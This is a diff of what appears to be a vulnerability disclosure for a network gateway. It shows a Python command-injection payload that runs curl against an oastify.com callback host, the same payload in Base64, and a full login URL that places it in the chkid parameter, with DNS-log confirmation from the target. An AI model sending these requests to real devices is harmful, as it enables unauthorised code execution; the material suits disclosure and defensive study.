@@ -21,8 +21,6 @@ import('os').system('curl njaexqxtvfe3h9v3k5jlaei2y14ksbg0.oastify.com')
 
 The Base64 encoded string is: 
  
- 
-1
 eydzVXNlckNvZGU6J2ltcG9ydCgnc29zJykuc3lzdGVtKCdjdXJsIG5qYWV4cXh0dmZlM2g5djNrNWpsYWVpMnl1NGtzYmcwLm9hc3RpZnkuY29tJyk=
  
  
@@ -30,18 +28,14 @@ eydzVXNlckNvZGU6J2ltcG9ydCgnc29zJykuc3lzdGVtKCdjdXJsIG5qYWV4cXh0dmZlM2g5djNrNWps
 Send the Request:
 Send a GET request to the /login?nl.lang=0 endpoint on the target gateway, including the encoded payload in the chkid parameter. 
  
-
+https://<GATEWAY_IP>:4433/login?nl.lang=0&title=1&oip=1&chkid=eydzVXNlckNvZGU6J2ltcG9ydCgnc29zJykuc3lzdGVtKCdjdXJsIG5qYWV4cXh0dmZlM2g5djNrNWpsYWVpMnl1NGtzYmcwLm9hc3RpZnkuY29tJyk=
      
-    1
-    https://<GATEWAY_IP>:4433/login?nl.lang=0&title=1&oip=1&chkid=eydzVXNlckNvZGU6J2ltcG9ydCgnc29zJykuc3lzdGVtKCdjdXJsIG5qYWV4cXh0dmZlM2g5djNrNWpsYWVpMnl1NGtzYmcwLm9hc3RpZnkuY29tJyk=
-     
-     <img width="1746" height="310" alt="image" src="https://github.com/user-attachments/assets/d39169bb-933a-4631-a491-2b45e72ad958" />
+<img width="1746" height="310" alt="image" src="https://github.com/user-attachments/assets/d39169bb-933a-4631-a491-2b45e72ad958" />
 
+(Note: The value of chkid is the Base64 string from step 1) 
 
-    (Note: The value of chkid is the Base64 string from step 1) 
-
-    Verify Execution:
-    As shown in the attached image, a DNS query log is observed on the oastify.com service from the target gateway's IP address (172.253.5.18), confirming that the curl command was successfully executed on the device. 
+Verify Execution:
+As shown in the attached image, a DNS query log is observed on the oastify.com service from the target gateway's IP address (172.253.5.18), confirming that the curl command was successfully executed on the device. 
      <img width="830" height="130" alt="image" src="https://github.com/user-attachments/assets/25583a96-23da-40b3-a336-a632d1c2b1a1" />
 
 
